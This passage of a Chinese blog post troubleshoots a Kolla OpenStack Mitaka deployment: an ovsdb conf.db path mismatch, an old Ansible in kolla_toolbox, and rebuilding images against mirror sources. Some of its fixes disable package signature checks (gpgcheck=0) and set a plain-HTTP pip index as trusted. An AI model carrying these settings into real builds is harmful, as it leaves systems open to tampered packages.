kolla/centos-source-openvswitch-db-server:<span class="number">2</span>.<span class="number">0</span>.<span class="number">2</span> /bin/bash</span><br></pre></td></tr></table></figure><h3 id="2-查看启动命令"><a href="#2-查看启动命令" class="headerlink" title="2. 查看启动命令"></a>2. 查看启动命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /usr/local/bin</span></span><br><span class="line"><span class="comment"># vi kolla_start</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">set</span> -o errexit</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wait for the log socket</span></span><br><span class="line"><span class="keyword">if</span> [[ ! <span class="string">&quot;<span class="variable">$&#123;!SKIP_LOG_SETUP[@]&#125;</span>&quot;</span> &amp;&amp; -e /var/lib/kolla/heka ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">while</span> [[ ! -S /var/lib/kolla/heka/<span class="built_in">log</span> ]]; <span class="keyword">do</span></span><br><span class="line">        sleep 1</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Processing /var/lib/kolla/config_files/config.json as root.  This is necessary</span></span><br><span class="line"><span class="comment"># to permit certain files to be controlled by the root user which should</span></span><br><span class="line"><span class="comment"># not be writable by the dropped-privileged user, especially /run_command</span></span><br><span class="line">sudo -E kolla_set_configs</span><br><span class="line">CMD=$(cat /run_command)</span><br><span class="line">ARGS=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ ! <span class="string">&quot;<span class="variable">$&#123;!KOLLA_SKIP_EXTEND_START[@]&#125;</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># Run additional commands if present</span></span><br><span class="line">    <span class="built_in">source</span> kolla_extend_start</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running command: &#x27;<span class="variable">$&#123;CMD&#125;</span><span class="variable">$&#123;ARGS:+ $ARGS&#125;</span>&#x27;&quot;</span></span><br><span class="line"><span class="built_in">exec</span> <span class="variable">$&#123;CMD&#125;</span> <span class="variable">$&#123;ARGS&#125;</span></span><br></pre></td></tr></table></figure><p>注意到 kolla_extend_start 这个脚本</p><h3 id="3-查看-kolla-extend-start"><a href="#3-查看-kolla-extend-start" class="headerlink" title="3. 查看 kolla_extend_start"></a>3. 查看 kolla_extend_start</h3><figure class="highlight d"><table><tr><td class="code"><pre><span class="line"># vi kolla_extend_start</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">mkdir -p <span class="string">&quot;/run/openvswitch&quot;</span></span><br><span class="line"><span class="keyword">if</span> [[ ! -e <span class="string">&quot;/etc/openvswitch/conf.db&quot;</span> ]]; then</span><br><span class="line">    ovsdb-tool create <span class="string">&quot;/etc/openvswitch/conf.db&quot;</span></span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>容器启动首先运行 kolla_start 脚本，当没有配置 KOLLA_SKIP_EXTEND_START 变量的时候继续执行 kolla_extend_start 进行一些初始化操作。<br>问题就出在创建 conf.db ，kolla_extend_start 创建的 conf.db 位于 /etc/openvswitch/conf.db ，而启动命令传入的路径却是 /var/lib/openvswitch/conf.db ，所以会报错找不到 /var/lib/openvswitch/conf.db</p><h2 id="修改方法"><a href="#修改方法" class="headerlink" title="修改方法"></a>修改方法</h2><p>两种修改方法，一是修改 openvswitch_db 镜像里面的 kolla_extend_start 脚本创建conf.db的位置，二是修改 openvswitch_db 容器的启动命令参数，这里为了镜像的完整性和操做便利我选择了方法二。<br>编辑 vim /etc/kolla/openvswitch-db-server/config.json 修改如下</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;/usr/sbin/ovsdb-server /etc/openvswitch/conf.db -vconsole:emer -vsyslog:err -vfile:info --remote=punix:/run/openvswitch/db.sock --log-file=/var/log/openvswitch/ovsdb-server.log&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;config_files&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种情况下的配置文件会被 clean-host 命令清理掉，所有我们继续查找 /etc/kolla/openvswitch-db-server/config.json 是在哪里生成的。<br>查找到如下位置 /usr/share/kolla/ansible/roles/neutron/templates/openvswitch-db-server.json.j2 当执行 deploy 操做的时候 openvswitch-db-server.json.j2 会被解析成 openvswitch-db-server.json 并复制到 /etc/kolla/的对应位置，所以只需要修改 openvswitch-db-server.json.j2 即可。</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># vim <span class="regexp">/usr/</span>share<span class="regexp">/kolla/</span>ansible<span class="regexp">/roles/</span>neutron<span class="regexp">/templates/</span>openvswitch-db-server.json.j2</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;command&quot;</span>: <span class="string">&quot;/usr/sbin/ovsdb-server /etc/openvswitch/conf.db -vconsole:emer -vsyslog:err -vfile:info --remote=punix:/run/openvswitch/db.sock --log-file=/var/log/openvswitch/ovsdb-server.log&quot;</span>,</span><br><span class="line">    <span class="string">&quot;config_files&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># <span class="regexp">/root/</span>kolla<span class="regexp">/tools/</span>cleanup-containers</span><br><span class="line"># <span class="regexp">/root/</span>kolla<span class="regexp">/tools/</span>cleanup-host</span><br><span class="line"># kolla-ansible deploy</span><br></pre></td></tr></table></figure><h1 id="问题二-kolla-toolbox-镜像中-ansible-版本不符"><a href="#问题二-kolla-toolbox-镜像中-ansible-版本不符" class="headerlink" title="问题二: kolla_toolbox 镜像中 ansible 版本不符"></a>问题二: kolla_toolbox 镜像中 ansible 版本不符</h1><h2 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h2><p>解决问题一后运行 deploy 到最后依旧会报错</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">TASK: [horizon | Creating the _member_ <span class="keyword">role</span>] ********************************** </span><br><span class="line">failed: [localhost] =&gt; &#123;&quot;attempts&quot;: <span class="number">10</span>, &quot;changed&quot;: <span class="keyword">false</span>, &quot;cmd&quot;: [&quot;docker&quot;, &quot;exec&quot;, &quot;-t&quot;, &quot;kolla_toolbox&quot;, &quot;/usr/bin/ansible&quot;, &quot;localhost&quot;, &quot;-m&quot;, &quot;os_keystone_role&quot;, &quot;-a&quot;, &quot;name=_member_ auth=&#123;# openstack_horizon_auth #&#125;&quot;, &quot;-e&quot;, &quot;&#123;&#x27;openstack_horizon_auth&#x27;:&#123;&#x27;username&#x27;: &#x27;admin&#x27;, &#x27;project_name&#x27;: &#x27;admin&#x27;, &#x27;password&#x27;: &#x27;admin&#x27;, &#x27;auth_url&#x27;: &#x27;http://172.16.15.115:35357&#x27;&#125;&#125;&quot;], &quot;delta&quot;: &quot;0:00:01.223878&quot;, &quot;end&quot;: &quot;2018-07-09 09:18:24.813123&quot;, &quot;failed&quot;: <span class="keyword">true</span>, &quot;rc&quot;: <span class="number">2</span>, &quot;start&quot;: &quot;2018-07-09 09:18:23.589245&quot;, &quot;stdout_lines&quot;: [&quot;localhost | FAILED! =&gt; &#123;&quot;, &quot;    \&quot;failed\&quot;: true, &quot;, &quot;    \&quot;msg\&quot;: \&quot;The module os_keystone_role was <span class="keyword">not</span> <span class="built_in">found</span> <span class="keyword">in</span> configured module paths. Additionally, core modules are missing. <span class="keyword">If</span> this <span class="keyword">is</span> a checkout, run <span class="string">&#x27;git submodule update --init --recursive&#x27;</span> <span class="keyword">to</span> correct this problem.\&quot;&quot;, &quot;&#125;&quot;], &quot;warnings&quot;: []&#125;</span><br><span class="line">stdout: localhost | FAILED! =&gt; &#123;</span><br><span class="line">    &quot;failed&quot;: <span class="keyword">true</span>, </span><br><span class="line">    &quot;msg&quot;: &quot;The module os_keystone_role was not found in configured module paths. Additionally, core modules are missing. If this is a checkout, run &#x27;git submodule update --init --recursive&#x27; to correct this problem.&quot;</span><br><span class="line">&#125;</span><br><span class="line">msg: Task failed <span class="keyword">as</span> maximum retries was encountered</span><br><span class="line"></span><br><span class="line">FATAL: <span class="keyword">all</span> hosts have already failed <span class="comment">-- aborting</span></span><br></pre></td></tr></table></figure><p>执行 git submodule update –init –recursive 后报此错误</p><h2 id="排查错误"><a href="#排查错误" class="headerlink" title="排查错误"></a>排查错误</h2><p>经查询这是一个 bug ,详情见: <a href="https://bugs.launchpad.net/kolla/+bug/1688167">Hitting ansible error “The module os_keystone_role was not found in configured module paths” </a></p><h3 id="1-查看-ansible-版本"><a href="#1-查看-ansible-版本" class="headerlink" title="1. 查看 ansible 版本"></a>1. 查看 ansible 版本</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># docker exec -ti kolla_toolbox <span class="regexp">/usr/</span>bin/ansible --version</span><br><span class="line"></span><br><span class="line">ansible <span class="number">2.1</span>.<span class="number">0</span></span><br><span class="line">  config <span class="keyword">file</span> = <span class="regexp">/home/</span>ansible/.ansible.cfg</span><br><span class="line">  configured module search path = <span class="regexp">/usr/</span>share/ansible</span><br></pre></td></tr></table></figure><h3 id="2-更新-ansible"><a href="#2-更新-ansible" class="headerlink" title="2. 更新 ansible"></a>2. 更新 ansible</h3><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker exec -ti kolla_toolbox sudo pip install ansible==2.1.1.0</span></span><br><span class="line"></span><br><span class="line">We trust you have received <span class="keyword">the</span> usual lecture <span class="keyword">from</span> <span class="keyword">the</span> <span class="keyword">local</span> System</span><br><span class="line">Administrator. It usually boils down <span class="keyword">to</span> these three things:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> ansible: </span><br></pre></td></tr></table></figure><p>需要 root 权限，容器是以 ansible 用户运行，并且没有密码，无法更新。执行尝试手动 build kolla_toolbox 镜像</p><h3 id="3-使用-kolla-toolbox-的-Dockerfile-文件手动-build-镜像"><a href="#3-使用-kolla-toolbox-的-Dockerfile-文件手动-build-镜像" class="headerlink" title="3. 使用 kolla_toolbox 的 Dockerfile 文件手动 build 镜像"></a>3. 使用 kolla_toolbox 的 Dockerfile 文件手动 build 镜像</h3><p>build 镜像的时候由于各种预制的源已经不存在或者无法访问，因此决定不使用官方pull的镜像，而采用手动更改源的地址，重新build所有镜像，所以也能解决问题二。</p><h1 id="问题三-重新build-kolla镜像"><a href="#问题三-重新build-kolla镜像" class="headerlink" title="问题三: 重新build kolla镜像"></a>问题三: 重新build kolla镜像</h1><h2 id="问题描述-2"><a href="#问题描述-2" class="headerlink" title="问题描述"></a>问题描述</h2><p>需要重新 build openstack mitaka的镜像，但是由于时间问题，镜像内部很多源的地址已经失效，手动替换源为可用的地址，重新build</p><h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><h3 id="1-修改kolla使用的源的地址"><a href="#1-修改kolla使用的源的地址" class="headerlink" title="1. 修改kolla使用的源的地址"></a>1. 修改kolla使用的源的地址</h3><p>以下文件会被 COPY 到容器内，可以直接修改</p><ul><li>kibana.yum.repo<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">修改为最新的6.x版本，4.x版本无法访问</span><br><span class="line">vi /usr/share/kolla/docker/base/kibana.yum.repo</span><br><span class="line"></span><br><span class="line"><span class="deletion">-[kibana-4.4]</span></span><br><span class="line"><span class="deletion">-name=Kibana repository for 4.4.x packages</span></span><br><span class="line"><span class="deletion">-baseurl=http://packages.elastic.co/kibana/4.4/centos</span></span><br><span class="line"><span class="deletion">-gpgcheck=1</span></span><br><span class="line"><span class="deletion">-gpgkey=http://packages.elastic.co/GPG-KEY-elasticsearch</span></span><br><span class="line"><span class="deletion">-enabled=1</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+[kibana-6.x]</span></span><br><span class="line"><span class="addition">+name=Kibana repository for 6.x packages</span></span><br><span class="line"><span class="addition">+baseurl=https://artifacts.elastic.co/packages/6.x/yum</span></span><br><span class="line"><span class="addition">+gpgcheck=0</span></span><br><span class="line"><span class="addition">+enabled=1</span></span><br></pre></td></tr></table></figure></li><li>elasticsearch.repo<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">为了和kibana的兼容性，修改elasticsearch源为6.x版本</span><br><span class="line"></span><br><span class="line"># vi /usr/share/kolla/docker/base/elasticsearch.repo</span><br><span class="line"></span><br><span class="line"><span class="deletion">-[elasticsearch-2.x]</span></span><br><span class="line"><span class="deletion">-name=Elasticsearch repository for 2.x packages</span></span><br><span class="line"><span class="deletion">-baseurl=http://packages.elastic.co/elasticsearch/2.x/centos</span></span><br><span class="line"><span class="deletion">-gpgcheck=1</span></span><br><span class="line"><span class="deletion">-gpgkey=http://packages.elastic.co/GPG-KEY-elasticsearch</span></span><br><span class="line"><span class="deletion">-enabled=1</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+[elasticsearch-6.x]</span></span><br><span class="line"><span class="addition">+name=Elasticsearch repository for 6.x packages</span></span><br><span class="line"><span class="addition">+baseurl=https://artifacts.elastic.co/packages/6.x/yum</span></span><br><span class="line"><span class="addition">+gpgcheck=0</span></span><br><span class="line"><span class="addition">+enabled=1   #elasticsearch的源在 AWS 上，国内访问不太稳定</span></span><br></pre></td></tr></table></figure><h3 id="2-修改-ceph、openstack、QEMU-EV-源地址"><a href="#2-修改-ceph、openstack、QEMU-EV-源地址" class="headerlink" title="2. 修改 ceph、openstack、QEMU-EV 源地址"></a>2. 修改 ceph、openstack、QEMU-EV 源地址</h3>因为 ceph 、openstack 和 QEMU-EV 的源是在安装了centos-release-ceph-hammer 、centos-release-openstack-mitaka 和 centos-release-qemu-ev 自动生成的因此需要修改对应的 Dockerfile文件，加入修改源地址的操作。<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"># vim /usr/share/kolla/docker/base/Dockerfile.j2</span><br><span class="line"></span><br><span class="line">RUN rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7 \</span><br><span class="line">    &amp;&amp; yum install -y \</span><br><span class="line">         epel-release \</span><br><span class="line"><span class="deletion">-        centos-release-openstack-mitaka \   #extra源里面已经没有centos-release-openstack-mitaka这个包，手动安装</span></span><br><span class="line"><span class="addition">+        http://mirror.neu.edu.cn/centos/7/cloud/x86_64/openstack-mitaka/centos-release-openstack-mitaka-1-5.el7.noarch.rpm \</span></span><br><span class="line">         yum-plugin-priorities \</span><br><span class="line">         centos-release-ceph-hammer \</span><br><span class="line">         centos-release-qemu-ev \</span><br><span class="line"><span class="addition">+   &amp;&amp; sed -i s/mirror.centos.org/mirror.neu.edu.cn/g /etc/yum.repos.d/CentOS-Ceph-Hammer.repo \</span></span><br><span class="line"><span class="addition">+   &amp;&amp; sed -i s/mirror.centos.org/mirror.neu.edu.cn/g /etc/yum.repos.d/CentOS-OpenStack-mitaka.repo \</span></span><br><span class="line"><span class="addition">+   &amp;&amp; sed -i s#mirror.centos.org/\$contentdir/#mirror.neu.edu.cn/centos/#g /etc/yum.repos.d/CentOS-QEMU-EV.repo \</span></span><br><span class="line"><span class="addition">+   &amp;&amp; rm -rf /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo \</span></span><br><span class="line">    &amp;&amp; rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7 \</span><br><span class="line">    &amp;&amp; rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-Storage \</span><br><span class="line">    &amp;&amp; rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-Virtualization \</span><br><span class="line">    &amp;&amp; yum clean all</span><br></pre></td></tr></table></figure><h3 id="3-使用阿里云和豆瓣的源进行加速"><a href="#3-使用阿里云和豆瓣的源进行加速" class="headerlink" title="3. 使用阿里云和豆瓣的源进行加速"></a>3. 使用阿里云和豆瓣的源进行加速</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"># vim /usr/share/kolla/docker/base/Dockerfile.j2</span><br><span class="line"></span><br><span class="line">RUN rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7 \</span><br><span class="line">    &amp;&amp; yum install -y \</span><br><span class="line">         epel-release \</span><br><span class="line">         http://mirror.neu.edu.cn/centos/7/cloud/x86_64/openstack-mitaka/centos-release-openstack-mitaka-1-5.el7.noarch.rpm \</span><br><span class="line">         yum-plugin-priorities \</span><br><span class="line">         centos-release-ceph-hammer \</span><br><span class="line">         centos-release-qemu-ev \</span><br><span class="line">    &amp;&amp; sed -i s/mirror.centos.org/mirror.neu.edu.cn/g /etc/yum.repos.d/CentOS-Ceph-Hammer.repo \</span><br><span class="line">    &amp;&amp; sed -i s/mirror.centos.org/mirror.neu.edu.cn/g /etc/yum.repos.d/CentOS-OpenStack-mitaka.repo \</span><br><span class="line">    &amp;&amp; sed -i s#mirror.centos.org/\$contentdir/#mirror.neu.edu.cn/centos/#g /etc/yum.repos.d/CentOS-QEMU-EV.repo \</span><br><span class="line"><span class="addition">+   &amp;&amp; rm -rf /etc/yum.repos.d/CentOS-Base.repo &amp;&amp; curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo \</span></span><br><span class="line"><span class="addition">+   &amp;&amp; rm -rf /etc/yum.repos.d/epel.* &amp;&amp; curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo \</span></span><br><span class="line">    &amp;&amp; rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7 \</span><br><span class="line">    &amp;&amp; rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-Storage \</span><br><span class="line">    &amp;&amp; rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-Virtualization \</span><br><span class="line">    &amp;&amp; yum clean all</span><br><span class="line">    </span><br><span class="line"><span class="addition">+#use douban source</span></span><br><span class="line"><span class="addition">+RUN mkdir ~/.pip \</span></span><br><span class="line"><span class="addition">+     &amp;&amp; &gt; ~/.pip/pip.conf \</span></span><br><span class="line"><span class="addition">+     &amp;&amp; echo &quot;[global]&quot; &gt; ~/.pip/pip.conf \</span></span><br><span class="line"><span class="addition">+     &amp;&amp; echo &quot;index-url = http://pypi.douban.com/simple&quot; &gt;&gt; ~/.pip/pip.conf \</span></span><br><span class="line"><span class="addition">+     &amp;&amp; echo &quot;[install]&quot; &gt;&gt; ~/.pip/pip.conf \</span></span><br><span class="line"><span class="addition">+     &amp;&amp; echo &quot;trusted-host = pypi.douban.com&quot; &gt;&gt; ~/.pip/pip.conf</span></span><br></pre></td></tr></table></figure><h3 id="4-修改-kolla-toolbox"><a href="#4-修改-kolla-toolbox" class="headerlink" title="4. 修改 kolla_toolbox"></a>4. 修改 kolla_toolbox</h3>测试发现编译 kolla_toolbox 镜像的时候使用 pip 安装python包的时候安装了最新的openstack client版本，需要安装 requests&gt;=2.14.2 ,由于依赖会升级 chardet, 而chardet 是系统依赖，在容器中无法升级。所以手动指定openstack client的版本，版本来源 <a href="https://releases.openstack.org/mitaka/index.html">OpenStack Projects Release Notes </a><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"># vim /usr/share/kolla/docker/kolla_toolbox/Dockerfile.j2</span><br><span class="line"></span><br><span class="line">RUN curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py \</span><br><span class="line">    &amp;&amp; python get-pip.py \</span><br><span class="line">    &amp;&amp; rm get-pip.py \</span><br><span class="line">    &amp;&amp; pip --no-cache-dir install \</span><br><span class="line"><span class="addition">+       openstacksdk==0.9.0 \</span></span><br><span class="line"><span class="addition">+       osc-lib==0.4.0 \</span></span><br><span class="line"><span class="addition">+       oslo.config==3.13.0 \</span></span><br><span class="line"><span class="addition">+       oslo.i18n==3.8.0 \</span></span><br><span class="line"><span class="addition">+       oslo.serialization==2.11.0 \</span></span><br><span class="line"><span class="addition">+       oslo.utils==3.16.0 \</span></span><br><span class="line"><span class="addition">+       python-cinderclient==1.8.0 \</span></span><br><span class="line"><span class="addition">+       python-glanceclient==2.2.0 \</span></span><br><span class="line"><span class="addition">+       python-heatclient==1.3.0 \</span></span><br><span class="line"><span class="addition">+       python-ironicclient==1.5.0 \</span></span><br><span class="line"><span class="addition">+       python-keystoneclient==3.2.0 \</span></span><br><span class="line"><span class="addition">+       python-neutronclient==4.2.0 \</span></span><br><span class="line"><span class="addition">+       python-novaclient==5.0.0 \</span></span><br><span class="line"><span class="addition">+       python-openstackclient==2.6.0 \</span></span><br><span class="line"><span class="addition">+       python-swiftclient==3.0.0 \</span></span><br><span class="line"><span class="addition">+       python-troveclient==2.3.0 \</span></span><br><span class="line"><span class="addition">+       stevedore==1.16.0 \</span></span><br><span class="line"><span class="addition">+       debtcollector==1.6.0 \</span></span><br><span class="line"><span class="addition">+       keystoneauth1==2.9.0 \</span></span><br><span class="line"><span class="addition">+       cliff==2.1.0 \</span></span><br><span class="line"><span class="addition">+       cmd2==0.6.8 \</span></span><br><span class="line"><span class="addition">+       pbr==1.10.0 \</span></span><br><span class="line"><span class="addition">+       requests==2.10.0 \</span></span><br><span class="line">        ansible==2.1.1.0 \</span><br><span class="line">        MySQL-python \</span><br><span class="line">        os-client-config==1.16.0 \</span><br><span class="line">        pyudev \</span><br><span class="line">        shade==1.4.0</span><br></pre></td></tr></table></figure></li></ul><h3 id="5-手动-build-镜像"><a href="#5-手动-build-镜像" class="headerlink" title="5. 手动 build 镜像"></a>5. 手动 build 镜像</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 只build基本的镜像</span></span><br><span class="line"><span class="meta"># kolla-build --base centos -t binary horizon cinder heat nova neutron glance keystone ironic rabbitmq keepalived haproxy heka kolla_toolbox mariadb memcached cron openvswitch</span></span><br></pre></td></tr></table></figure><h3 id="6-查看编译后的镜像"><a href="#6-查看编译后的镜像" class="headerlink" title="6. 查看编译后的镜像"></a>6. 查看编译后的镜像</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker images</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">REPOSITORY</span>                                      TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-openvswitch-db-server       <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">58</span>e<span class="number">8</span>a<span class="number">1</span>cdc<span class="number">387</span>        <span class="number">10</span> minutes ago       <span class="number">379</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-openvswitch-vswitchd        <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               cb<span class="number">85</span>d<span class="number">198</span>f<span class="number">02</span>c        <span class="number">10</span> minutes ago       <span class="number">379</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-openvswitch-base            <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">0</span>baee<span class="number">06</span>b<span class="number">57</span>a<span class="number">4</span>        <span class="number">10</span> minutes ago       <span class="number">379</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-kolla-toolbox               <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               d<span class="number">3</span>f<span class="number">9</span>e<span class="number">86</span>e<span class="number">1292</span>        <span class="number">43</span> minutes ago      <span class="number">631</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-base                        <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">4481</span>fe<span class="number">643</span>afa        About an hour ago   <span class="number">344</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-openvswitch-base            <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">09</span>ab<span class="number">40</span>d<span class="number">1</span>a<span class="number">684</span>        <span class="number">6</span> hours ago         <span class="number">380</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-ironic-inspector            <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">0</span>a<span class="number">692</span>e<span class="number">9</span>b<span class="number">679</span>e        <span class="number">10</span> hours ago        <span class="number">641</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-ironic-api                  <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">087</span>a<span class="number">20</span>a<span class="number">24</span>a<span class="number">84</span>        <span class="number">10</span> hours ago        <span class="number">635</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-ironic-conductor            <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">35450</span>cd<span class="number">6</span>b<span class="number">73</span>b        <span class="number">10</span> hours ago        <span class="number">662</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-nova-compute-ironic         <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               d<span class="number">0</span>a<span class="number">5</span>a<span class="number">0</span>a<span class="number">85</span>ab<span class="number">7</span>        <span class="number">10</span> hours ago        <span class="number">1</span>.<span class="number">07</span> GB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-ironic-pxe                  <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               d<span class="number">505622</span>b<span class="number">6982</span>        <span class="number">10</span> hours ago        <span class="number">639</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-elasticsearch               <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">63064</span>a<span class="number">9</span>d<span class="number">79</span>d<span class="number">1</span>        <span class="number">10</span> hours ago        <span class="number">692</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-kibana                      <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               d<span class="number">52426</span>e<span class="number">4</span>d<span class="number">06</span>f        <span class="number">10</span> hours ago        <span class="number">874</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-ironic-base                 <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">09</span>a<span class="number">4902</span>a<span class="number">06</span>be        <span class="number">10</span> hours ago        <span class="number">612</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-nova-libvirt                <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">81</span>f<span class="number">523</span>f<span class="number">3</span>d<span class="number">656</span>        <span class="number">11</span> hours ago        <span class="number">1</span>.<span class="number">11</span> GB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-nova-compute                <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">5</span>b<span class="number">70975</span>fe<span class="number">56</span>d        <span class="number">11</span> hours ago        <span class="number">1</span>.<span class="number">11</span> GB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-cinder-volume               <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               acc<span class="number">66141</span>a<span class="number">640</span>        <span class="number">11</span> hours ago        <span class="number">859</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-cinder-api                  <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">5</span>ff<span class="number">44</span>bfe<span class="number">4063</span>        <span class="number">11</span> hours ago        <span class="number">850</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-cinder-rpcbind              <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               d<span class="number">241518</span>b<span class="number">407</span>c        <span class="number">11</span> hours ago        <span class="number">838</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-cinder-backup               <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">70</span>e<span class="number">279</span>b<span class="number">6</span>adc<span class="number">7</span>        <span class="number">11</span> hours ago        <span class="number">808</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-cinder-scheduler            <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               d<span class="number">4</span>c<span class="number">8</span>e<span class="number">5140</span>be<span class="number">4</span>        <span class="number">11</span> hours ago        <span class="number">808</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-glance-api                  <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">92</span>ed<span class="number">32</span>bb<span class="number">6344</span>        <span class="number">11</span> hours ago        <span class="number">732</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-nova-conductor              <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               c<span class="number">7</span>f<span class="number">752689</span>dfc        <span class="number">11</span> hours ago        <span class="number">671</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-nova-consoleauth            <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">5</span>bb<span class="number">4</span>f<span class="number">725</span>b<span class="number">42</span>d        <span class="number">11</span> hours ago        <span class="number">671</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-nova-scheduler              <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">00</span>ddedda<span class="number">23</span>c<span class="number">4</span>        <span class="number">11</span> hours ago        <span class="number">671</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-glance-registry             <span 